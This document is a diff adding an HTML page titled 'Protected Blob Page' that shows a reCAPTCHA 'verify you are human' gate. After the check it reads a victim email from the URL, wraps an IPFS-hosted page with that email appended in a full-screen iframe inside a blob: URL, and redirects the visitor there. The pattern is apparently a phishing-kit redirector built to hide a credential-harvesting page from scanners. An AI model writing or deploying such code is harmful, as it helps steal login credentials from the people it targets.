@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Protected Blob Page</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+
+<div>
+    <h3>Verify you are human</h3>
+
+    <div class="g-recaptcha"
+         data-sitekey="6LfP9B0sAAAAAGvBmxh4ISgk9hIwojbbGQca9epS"
+         data-callback="captchaPassed"></div>
+
+    <p id="msg"></p>
+</div>
+
+<script>
+const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+
+function getEmail() {
+    const params = new URLSearchParams(location.search);
+    return params.get("email") || "";
+}
+
+function buildFinalURL(email) {
+    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
+}
+
+function captchaPassed(token) {
+    document.getElementById("msg").innerText = "Checking...";
+
+    fetch("/api/verify-captcha", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token })
+    })
+    .then(res => res.json())
+    .then(result => {
+        if (!result.success) {
+            alert("Verification failed");
+            return;
+        }
+
+        const email = getEmail();
+        const blobHTML = `
+            <html><body style="margin:0">
+            <iframe src="${buildFinalURL(email)}"
+                    style="width:100vw;height:100vh;border:none"></iframe>
+            </body></html>
+        `;
+
+        const blob = new Blob([blobHTML], { type: "text/html" });
+        const blobURL = URL.createObjectURL(blob);
+
+        window.location.replace(blobURL);
+    });
+}
+</script>
+
+</body>
+</html>
